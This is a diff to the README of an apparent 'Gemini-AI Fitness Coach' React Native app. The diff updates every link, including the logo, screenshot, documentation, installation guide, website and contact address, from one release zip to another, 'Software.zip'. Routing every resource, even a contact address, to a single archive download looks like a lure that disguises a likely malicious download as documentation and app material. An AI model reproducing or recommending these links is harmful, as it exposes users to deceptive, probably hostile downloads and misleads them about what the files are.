@@ -1,6 +1,6 @@
 # 🏋️‍♂️ Gemini-AI Fitness Coach React Native App
 
-![Gemini-AI Logo](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)
+![Gemini-AI Logo](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of the Gemini-AI Fitness Coach React Native Mobile Application! This app is your personalized fitness coach powered by cutting-edge AI technology. Whether you are looking to improve your workouts, track your progress, or receive customized training plans, Gemini-AI has got you covered. With React Native and TypeScript, this app delivers a seamless and efficient mobile experience. Let's get started on your fitness journey with Gemini-AI!
 
@@ -18,7 +18,7 @@ To begin using Gemini-AI Fitness Coach React Native App, follow these simple ste
 2. Install the necessary dependencies using `npm install`.
 3. Run the app on your Android or iOS device using Expo or Android Studio.
 
-For detailed instructions, refer to the official [documentation](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip).
+For detailed instructions, refer to the official [documentation](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip).
 
 ## 🌟 Features
 
@@ -29,7 +29,7 @@ For detailed instructions, refer to the official [documentation](https://github.
 🔹 User-Friendly Interface  
 🔹 Mobile Optimization  
 
-![Gemini-AI App Screenshot](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)
+![Gemini-AI App Screenshot](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)
 
 ## 🛠️ Technologies Used
 
@@ -41,7 +41,7 @@ For detailed instructions, refer to the official [documentation](https://github.
 
 ## 📦 Installation
 
-To install Gemini-AI Fitness Coach React Native App, simply follow the [installation guide](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip).
+To install Gemini-AI Fitness Coach React Native App, simply follow the [installation guide](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip).
 
 ## 🤖 Support
 
@@ -50,8 +50,8 @@ If you encounter any issues while using the Gemini-AI Fitness Coach React Native
 ## 🌐 Additional Resources
 
 Explore more about Gemini-AI and our other projects:
-- [Gemini-AI Website](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)
-- [Gemini-API Repository](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)
+- [Gemini-AI Website](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)
+- [Gemini-API Repository](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)
 
 ## 🚧 Contributing
 
@@ -59,10 +59,10 @@ We welcome contributions from the community to enhance the Gemini-AI Fitness Coa
 
 ## 📞 Contact Us
 
-For any inquiries or feedback, please contact us at https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip
+For any inquiries or feedback, please contact us at https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip
 
 ---
 
 Let's embark on a fitness journey like never before with Gemini-AI Fitness Coach React Native App! Download the app today and start achieving your fitness goals with the power of AI and technology. 🚀
 
-[![Download Gemini-AI App](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v1.0/Soft.zip)
+[![Download Gemini-AI App](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)](https://github.com/cashstoreofc/Gemini-AI-React-Native-App/releases/download/v2.0/Software.zip)
